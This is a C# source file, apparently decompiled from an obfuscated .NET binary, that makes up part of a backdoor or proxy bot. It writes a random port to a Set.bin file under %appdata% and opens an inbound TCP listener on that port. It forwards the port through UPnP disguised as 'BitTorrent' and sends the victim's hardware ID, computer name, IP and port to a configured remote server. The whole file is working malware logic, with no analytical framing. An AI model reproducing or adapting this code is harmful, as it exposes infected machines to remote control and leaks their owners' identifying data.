using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;

public sealed class GClass3
{
	private static Random random_0 = new Random();

	public static void smethod_0()
	{
		if (smethod_3())
		{
			StreamWriter streamWriter = new StreamWriter(Environment.GetEnvironmentVariable("appdata") + "\\" + Class15.string_8 + "\\Set.bin");
			streamWriter.WriteLine(random_0.Next(2000, 20000));
			streamWriter.Close();
		}
		StreamReader streamReader = new StreamReader(Environment.GetEnvironmentVariable("appdata") + "\\" + Class15.string_8 + "\\Set.bin");
		int port = Convert.ToInt32(streamReader.ReadLine());
		new Thread(smethod_1).Start();
		Thread.Sleep(5000);
		TcpListener tcpListener = new TcpListener(port);
		new Thread(smethod_2).Start();
		tcpListener.Start();
		while (true)
		{
			TcpClient tcpClient_ = tcpListener.AcceptTcpClient();
			GClass0 @object = new GClass0(tcpClient_);
			Thread thread = new Thread(@object.method_0);
			thread.Start();
		}
	}

	public static void smethod_1()
	{
		try
		{
			StreamReader streamReader = new StreamReader(Environment.GetEnvironmentVariable("appdata") + "\\" + Class15.string_8 + "\\Set.bin");
			int num = Convert.ToInt32(streamReader.ReadLine());
			GClass4.smethod_4();
			GClass4.smethod_8(num, num, "TCP", "BitTorrent");
		}
		catch
		{
		}
	}

	public static void smethod_2()
	{
		Thread.Sleep(10000);
		StreamReader streamReader = new StreamReader(Environment.GetEnvironmentVariable("appdata") + "\\" + Class15.string_8 + "\\Set.bin");
		int num = Convert.ToInt32(streamReader.ReadLine());
		try
		{
			GClass2.smethod_0(Class0.smethod_4(), num, "www.google.com", 80, Class15.string_6, Class15.string_7);
			string string_ = "hwid=" + Class0.smethod_5() + "&cn=" + Class0.smethod_2() + "&ip=" + GClass4.smethod_5() + "&port=" + num;
			Class7.smethod_1(Class15.string_3, string_);
		}
		catch
		{
		}
	}

	public static bool smethod_3()
	{
		if (File.Exists(Environment.GetEnvironmentVariable("appdata") + "\\" + Class15.string_8 + "\\Set.bin"))
		{
			return false;
		}
		return true;
	}
}
